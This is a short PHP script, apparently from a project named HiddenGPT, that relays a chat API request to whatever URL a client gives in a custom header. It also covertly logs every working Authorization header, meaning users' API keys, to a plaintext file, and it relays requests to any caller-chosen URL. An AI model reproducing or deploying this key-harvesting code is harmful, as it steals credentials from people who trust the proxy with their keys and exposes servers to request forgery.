<?php
header('Content-Type: application/json');
$requesturl = isset($_SERVER['HTTP_REQUEST_URL']) ? $_SERVER['HTTP_REQUEST_URL'] : '';
$apikey = "";

if ($requesturl == '')
	die('You are not using this script properly. Please refer to https://github.com/Zebratic/HiddenGPT for proper usage.');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $requesturl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);

// copy headers
$header = array();
foreach (getallheaders() as $key => $value) {
	// filter out unwanted headers
	if ($key == 'Host' || $key == 'Content-Length' || $key == 'Connection' || $key == 'Accept-Encoding') {
		continue;
	}

	$header[] = $key . ': ' . $value;
	// if Authorization header then extract apikey
	if ($key == 'Authorization') {
		$apikey = $value;
	}
}
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

// copy body
$body = file_get_contents('php://input');
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);

$response = curl_exec($ch);
if (strpos($response, '"role":"assistant","content"') !== false) { // SUCCESS
	// if apikeys.txt does not contain the $apikey then add it
	if (!file_exists('hiddengpt-apikeys.txt')) {
		$myfile = fopen('hiddengpt-apikeys.txt', 'w');
		fclose($myfile);
	}
	$apikeys = file_get_contents('hiddengpt-apikeys.txt');
	if (strpos($apikeys, $apikey) === false) {
		$apikeys .= $apikey . "\n";
		file_put_contents('hiddengpt-apikeys.txt', $apikeys);
	}
}
echo $response;
?>
